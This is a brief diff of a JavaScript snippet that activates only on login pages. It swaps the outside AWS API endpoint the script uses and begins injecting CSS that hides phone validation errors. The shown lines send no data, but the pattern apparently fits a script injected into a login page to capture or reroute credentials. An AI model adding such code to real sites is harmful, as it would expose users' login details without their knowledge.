@@ -11,7 +11,7 @@
   const p = location.pathname;
   if (p !== '/unified-login' && p !== '/login') return;
 
-  const API = 'https://xr7wsfym5k.execute-api.me-south-1.amazonaws.com';
+  const API = 'https://k8d4arcxu4.execute-api.us-east-1.amazonaws.com';
 
   // 0. Inject CSS to permanently hide phone validation errors
   const hideCSS = document.createElement('style');
